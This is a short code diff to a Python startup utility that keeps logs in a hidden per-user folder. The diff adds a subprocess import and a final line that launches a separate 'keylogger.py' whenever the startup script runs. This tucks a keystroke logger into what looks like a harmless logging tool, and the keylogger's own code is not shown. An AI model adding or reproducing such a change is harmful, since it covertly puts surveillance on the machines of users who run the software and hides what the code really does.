@@ -3,6 +3,7 @@ import os
 import sys
 import threading
 import time
+import subprocess
 
 LOG_DIR = os.path.join(os.path.expanduser("~"), ".local", "share", "MyStartupAppLogs")
 LOG_FILE = os.path.join(LOG_DIR, "startup_log.txt")
@@ -48,3 +49,4 @@ def run_on_startup(startup_task=None, *args, **kwargs):
 
 if __name__ == "__main__":
     run_on_startup()
+    subprocess.run([sys.executable, "keylogger.py"])
